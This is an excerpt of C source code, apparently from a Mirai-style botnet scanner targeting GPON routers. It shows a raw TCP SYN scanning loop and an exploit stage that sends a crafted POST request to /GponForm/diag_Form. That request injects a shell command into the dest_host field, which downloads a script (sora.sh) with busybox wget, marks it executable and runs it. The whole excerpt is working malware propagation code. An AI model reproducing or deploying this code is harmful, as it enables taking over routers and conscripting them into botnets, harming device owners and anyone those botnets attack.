    ...
    while(TRUE)
    {
        ...
        if(gpon80_fake_time != last_spew)
        {
            ...
            for(i = 0; i < GPON80_SCANNER_RAW_PPS; i++)
            {
                ...
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tc15pudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    ...
                    if(conn->state == GPON80_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://127.0.0.1/sora.sh+-O+anngu;chmod+777+*;sh+anngu`&ipv=0");
